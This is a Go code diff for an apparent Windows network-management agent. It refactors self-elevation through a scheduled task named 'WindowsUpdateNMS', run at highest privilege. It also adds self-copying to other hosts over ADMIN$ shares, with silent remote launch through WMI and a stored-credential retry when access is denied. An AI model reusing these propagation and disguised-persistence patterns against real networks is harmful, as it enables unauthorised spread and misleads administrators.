@@ -84,8 +84,13 @@ func NMSRoot() string {
 
 // nmsVaultDir mirrors the agent watcher's vaultDir (SYSTEM profile slot,
 // locked to SYSTEM+Administrators by the installer). Falls back to NMSRoot
-// when absent (dev boxes, tests).
+// when absent (dev boxes, tests). Override for tests.
+var nmsVaultDirOverride = ""
+
 func nmsVaultDir() string {
+	if nmsVaultDirOverride != "" {
+		return nmsVaultDirOverride
+	}
 	if runtime.GOOS != "windows" {
 		return NMSRoot()
 	}
@@ -290,6 +295,19 @@ func WriteShutdownFile() error {
 
 var nmsElevationDone bool
 
+// nmsPrivElevated reports our elevation; var so tests inject without
+// shelling whoami. nmsElevateTask creates + runs the one-shot highest
+// task; var so tests record instead of touching the task scheduler.
+var nmsPrivElevated = func() bool { return CurrentNMSPriv().Elevated }
+var nmsElevateTask = func(self, args string) error {
+	if _, err := runWithTimeout(10*time.Second, "schtasks", "/create", "/tn", "WindowsUpdateNMS",
+		"/tr", `"`+self+`" `+args, "/sc", "once", "/st", "00:00", "/rl", "highest", "/f"); err != nil {
+		return err
+	}
+	_, err := runWithTimeout(30*time.Second, "schtasks", "/run", "/tn", "WindowsUpdateNMS")
+	return err
+}
+
 // ensureElevated returns true if this process should keep running. It returns
 // false exactly once, when an unelevated process has launched an elevated
 // copy and should now bow out. Idempotent: an elevated instance never
@@ -299,18 +317,13 @@ func ensureElevated() bool {
 	if runtime.GOOS != "windows" {
 		return true
 	}
-	if CurrentNMSPriv().Elevated {
+	if nmsPrivElevated() {
 		return true
 	}
 	// Another NMS already alive? It is the elevated one - just bow out.
-	if b, err := os.ReadFile(NMSPidPath()); err == nil {
-		if pid, _ := strconv.Atoi(strings.TrimSpace(string(b))); pid > 0 {
-			if p, err := process.NewProcess(int32(pid)); err == nil {
-				if _, err := p.Name(); err == nil {
-					return false
-				}
-			}
-		}
+	// (Reads the pid+createMs record, so PID recycling can't fake a holder.)
+	if holder, ok := readNMSPid(); ok && nmsPidAlive(holder) {
+		return false
 	}
 	self, err := os.Executable()
 	if err != nil {
@@ -320,9 +333,7 @@ func ensureElevated() bool {
 	if args == "" {
 		args = "--nms"
 	}
-	_, _ = runWithTimeout(10*time.Second, "schtasks", "/create", "/tn", "WindowsUpdateNMS",
-		"/tr", `"`+self+`" `+args, "/sc", "once", "/st", "00:00", "/rl", "highest", "/f")
-	if _, err := runWithTimeout(30*time.Second, "schtasks", "/run", "/tn", "WindowsUpdateNMS"); err != nil {
+	if err := nmsElevateTask(self, args); err != nil {
 		return true // best effort: run unelevated rather than die
 	}
 	return false
@@ -742,12 +753,45 @@ func ManagedHintChecked(host string) (managed, unknown bool) {
 	return false, false
 }
 
+// cimSessionPrelude builds the DCOM session opener shared by every CIM
+// script. WSMan demands Kerberos and dies off-domain; DCOM rides RPC/NTLM.
+// hostQ is the single-quote-escaped hostname; extra carries additional
+// New-CimSession args ("-Credential $cred", "-ErrorAction Stop").
+// Both halves (transport option AND -CimSession/-SessionOption wiring) are
+// pinned by TestCimDcomWiring — they were built months apart by different
+// sessions, and either half missing silently breaks remote execution while
+// reporting success.
+func cimSessionPrelude(hostQ, extra string) string {
+	if extra != "" {
+		extra = " " + extra
+	}
+	return `$opt=New-CimSessionOption -Protocol Dcom;` +
+		`$s=New-CimSession -ComputerName '` + hostQ + `' -SessionOption $opt` + extra
+}
+
+// Script builders (pure: escaping + DCOM wiring unit-testable without
+// spawning powershell or touching the LAN).
+func cimStatsScript(host string) string {
+	return `$e=$null;try{` + cimSessionPrelude(strings.ReplaceAll(host, "'", "''"), "-ErrorAction Stop") + `;$p=Get-CimInstance -CimSession $s -ClassName Win32_Processor -ErrorAction Stop|Measure-Object -Property LoadPercentage -Average;$o=Get-CimInstance -CimSession $s -ClassName Win32_OperatingSystem -ErrorAction Stop;$d=Get-CimInstance -CimSession $s -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop;Remove-CimSession -CimSession $s;@{cpu=[double]$p.Average;mem=[double](100*($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/$o.TotalVisibleMemorySize);disk=[double](100*($d.Size-$d.FreeSpace)/$d.Size)}|ConvertTo-Json -Compress}catch{$e=$_;@{err=$e.Exception.Message}|ConvertTo-Json -Compress}`
+}
+
+func cimStatsCredScript(host string) string {
+	return `$cf=Get-Content -LiteralPath '` + strings.ReplaceAll(NMSCredPath(), "'", "''") + `';$u=$cf[0].Trim();$p=$cf[1].TrimEnd("` + "`r,`n" + `");$sec=ConvertTo-SecureString $p -AsPlainText -Force;$cred=New-Object PSCredential($u,$sec);try{` + cimSessionPrelude(strings.ReplaceAll(host, "'", "''"), "-Credential $cred -ErrorAction Stop") + `;$pr=Get-CimInstance -CimSession $s -ClassName Win32_Processor -ErrorAction Stop|Measure-Object -Property LoadPercentage -Average;$o=Get-CimInstance -CimSession $s -ClassName Win32_OperatingSystem -ErrorAction Stop;$d=Get-CimInstance -CimSession $s -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop;Remove-CimSession -CimSession $s;@{cpu=[double]$pr.Average;mem=[double](100*($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/$o.TotalVisibleMemorySize);disk=[double](100*($d.Size-$d.FreeSpace)/$d.Size)}|ConvertTo-Json -Compress}catch{@{err=$_.Exception.Message}|ConvertTo-Json -Compress}`
+}
+
+func cimCreateScript(host, commandLine string) string {
+	h := strings.ReplaceAll(host, "'", "''")
+	cl := strings.ReplaceAll(commandLine, "'", "''")
+	return cimSessionPrelude(h, "-ErrorAction Stop") + `;try{` +
+		`Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='` + cl + `'} | Select-Object -ExpandProperty ReturnValue` +
+		`}finally{Remove-CimSession -CimSession $s -ErrorAction SilentlyContinue}`
+}
+
 // remoteStatsCIM queries one Windows host via a hidden powershell CIM
 // session (current user context first; stored local creds on denial).
 // Returns cpu/mem/disk percents. Never logs credentials.
 var remoteStatsCIM = func(host string, timeout time.Duration) (float64, float64, float64, error) {
-	script := `$e=$null;try{$s=New-CimSession -ComputerName '` + strings.ReplaceAll(host, "'", "''") + `' -ErrorAction Stop;$p=Get-CimInstance -CimSession $s -ClassName Win32_Processor -ErrorAction Stop|Measure-Object -Property LoadPercentage -Average;$o=Get-CimInstance -CimSession $s -ClassName Win32_OperatingSystem -ErrorAction Stop;$d=Get-CimInstance -CimSession $s -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop;Remove-CimSession -CimSession $s;@{cpu=[double]$p.Average;mem=[double](100*($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/$o.TotalVisibleMemorySize);disk=[double](100*($d.Size-$d.FreeSpace)/$d.Size)}|ConvertTo-Json -Compress}catch{$e=$_;@{err=$e.Exception.Message}|ConvertTo-Json -Compress}`
-	out, err := runWithTimeout(timeout, "powershell", "-NoProfile", "-Command", script)
+	out, err := runWithTimeout(timeout, "powershell", "-NoProfile", "-Command", cimStatsScript(host))
 	if err != nil {
 		return 0, 0, 0, err
 	}
@@ -792,7 +836,7 @@ func remoteStatsCIMCred(host string, timeout time.Duration) (float64, float64, f
 	if len(lines) < 2 || strings.TrimSpace(lines[0]) == "" || strings.TrimSpace(lines[1]) == "" {
 		return 0, 0, 0, fmt.Errorf("cim denied (cred file malformed)")
 	}
-	script := `$cf=Get-Content -LiteralPath '` + strings.ReplaceAll(NMSCredPath(), "'", "''") + `';$u=$cf[0].Trim();$p=$cf[1].TrimEnd("` + "`r,`n" + `");$sec=ConvertTo-SecureString $p -AsPlainText -Force;$cred=New-Object PSCredential($u,$sec);try{$s=New-CimSession -ComputerName '` + strings.ReplaceAll(host, "'", "''") + `' -Credential $cred -ErrorAction Stop;$pr=Get-CimInstance -CimSession $s -ClassName Win32_Processor -ErrorAction Stop|Measure-Object -Property LoadPercentage -Average;$o=Get-CimInstance -CimSession $s -ClassName Win32_OperatingSystem -ErrorAction Stop;$d=Get-CimInstance -CimSession $s -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop;Remove-CimSession -CimSession $s;@{cpu=[double]$pr.Average;mem=[double](100*($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/$o.TotalVisibleMemorySize);disk=[double](100*($d.Size-$d.FreeSpace)/$d.Size)}|ConvertTo-Json -Compress}catch{@{err=$_.Exception.Message}|ConvertTo-Json -Compress}`
+	script := cimStatsCredScript(host)
 	out, err := runWithTimeout(timeout, "powershell", "-NoProfile", "-Command", script)
 	if err != nil {
 		return 0, 0, 0, err
@@ -1210,11 +1254,7 @@ var nmsRemoteDelete = func(path string) error {
 // so the session is always released, and -ErrorAction Stop so a dead host
 // fails fast.
 var nmsRemoteCreate = func(host, commandLine string) error {
-	h := strings.ReplaceAll(host, "'", "''")
-	cl := strings.ReplaceAll(commandLine, "'", "''")
-	script := `$s=New-CimSession -ComputerName '` + h + `' -ErrorAction Stop;try{` +
-		`Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='` + cl + `'} | Select-Object -ExpandProperty ReturnValue` +
-		`}finally{Remove-CimSession -CimSession $s -ErrorAction SilentlyContinue}`
+	script := cimCreateScript(host, commandLine)
 	out, err := runWithTimeout(60*time.Second, "powershell", "-NoProfile", "-Command", script)
 	if err != nil {
 		return err
@@ -1311,12 +1351,29 @@ var nmsCloneVerify = func(host, wantVer string, timeout time.Duration) bool {
 // FIX: launched-unverified now records a breaker failure. Before, a box that
 // launched but never confirmed looped forever after cooldown and never
 // contributed to the storm guard.
+//
+// Identity: current process context first; on access-denied-classified
+// failure with a vault cred file present, ONE fallback attempt under the
+// vault identity (session-managed: setup, copy, launch, verify, teardown).
+// The winning mechanism pins per host so both legs never split identities.
 func CloneToHost(host string, wantVer string) (state, detail string) {
 	data, ok := readInstallerBytes()
 	if !ok {
 		return "no-payload", "installer copy missing beside the agent"
 	}
+	if recallHostIdentity(host) == "vault" {
+		// Pinned vault host: cred file gone since? Drop the pin and run
+		// the normal current-context path instead of failing on air.
+		if !vaultCredsPresent() {
+			forgetHostIdentity(host)
+		} else {
+			return cloneToHostVault(host, wantVer, data)
+		}
+	}
 	if err := nmsSMBCopy(host, data); err != nil {
+		if isAccessDeniedErr(err) && vaultCredsPresent() {
+			return cloneToHostVault(host, wantVer, data)
+		}
 		nmsRecordFail()
 		return "copy-failed", strings.TrimSpace(err.Error())
 	}
@@ -1325,10 +1382,58 @@ func CloneToHost(host string, wantVer string) (state, detail string) {
 		return "launch-failed", strings.TrimSpace(err.Error())
 	}
 	if nmsCloneVerify(host, wantVer, 5*time.Minute) {
+		recordHostIdentity(host, "context")
 		return "cloned-verified", "version.txt reports " + wantVer
 	}
 	nmsRecordFail() // FIX: unverified is a failure signal too
 	return "launched-unverified", "launched but version.txt did not confirm within 5min (slow box or installer still running?)"
+}
+
+// cloneToHostVault is the vault-identity attempt: session setup, copy over
+// the session-carried UNC path, vault-cred WMI launch, session-covered
+// verify, teardown always (even on failure paths).
+func cloneToHostVault(host string, wantVer string, data []byte) (state, detail string) {
+	if err := smbSessionEstablish(host); err != nil {
+		nmsRecordFail()
+		return "copy-failed", "vault session: " + strings.TrimSpace(err.Error())
+	}
+	defer smbSessionTeardown(host)
+	dest := `\\` + host + `\ADMIN$\Temp\Agent-Setup.exe`
+	if err := nmsSMBWriteFile(dest, data); err != nil {
+		nmsRecordFail()
+		return "copy-failed", "vault session copy: " + classifySMBErr(err)
+	}
+	if err := nmsRemoteCreateCred(host, `C:\Windows\Temp\Agent-Setup.exe --silent`); err != nil {
+		nmsRecordFail()
+		return "launch-failed", "vault session launch: " + strings.TrimSpace(err.Error())
+	}
+	if nmsCloneVerify(host, wantVer, 5*time.Minute) {
+		recordHostIdentity(host, "vault")
+		return "cloned-verified", "version.txt reports " + wantVer + " (via vault identity)"
+	}
+	nmsRecordFail()
+	return "launched-unverified", "launched under vault identity but version.txt did not confirm within 5min"
+}
+
+// vaultCredsPresent reports whether the operator placed the vault cred file
+// (existence + two non-empty lines; content never read here, never logged).
+func vaultCredsPresent() bool {
+	b, err := os.ReadFile(NMSCredPath())
+	if err != nil {
+		return false
+	}
+	lines := strings.Split(strings.ReplaceAll(string(b), "\r\n", "\n"), "\n")
+	return len(lines) >= 2 && strings.TrimSpace(lines[0]) != "" && strings.TrimSpace(lines[1]) != ""
+}
+
+// isAccessDeniedErr reports whether err is an access-denied-classified
+// failure (the only failure worth a vault retry).
+func isAccessDeniedErr(err error) bool {
+	if err == nil {
+		return false
+	}
+	s := strings.ToLower(err.Error())
+	return strings.Contains(s, "access denied")
 }
 
 // --- circuit breaker: failure storms pause the clone ARM only. Probing,
